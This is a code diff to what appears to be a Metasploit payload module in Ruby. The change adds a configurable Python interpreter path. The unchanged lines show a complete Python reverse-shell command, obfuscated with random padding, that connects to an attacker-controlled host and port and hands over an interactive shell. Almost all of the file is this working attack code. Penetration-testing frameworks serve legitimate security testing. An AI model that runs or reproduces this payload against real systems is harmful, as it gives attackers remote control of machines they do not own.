@@ -28,7 +28,8 @@ module MetasploitModule
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
     register_options([
-      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
+      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash']),
+      OptString.new('PYTHON_PATH', [true, 'Path to the Python interpreter', 'python'])
     ])
   end
 
@@ -51,6 +52,6 @@ module MetasploitModule
   def command_string
     raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
     cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
-    "python -c \"#{ py_create_exec_stub(cmd) }\""
+    "#{datastore['PYTHON_PATH']} -c \"#{ py_create_exec_stub(cmd) }\""
   end
 end
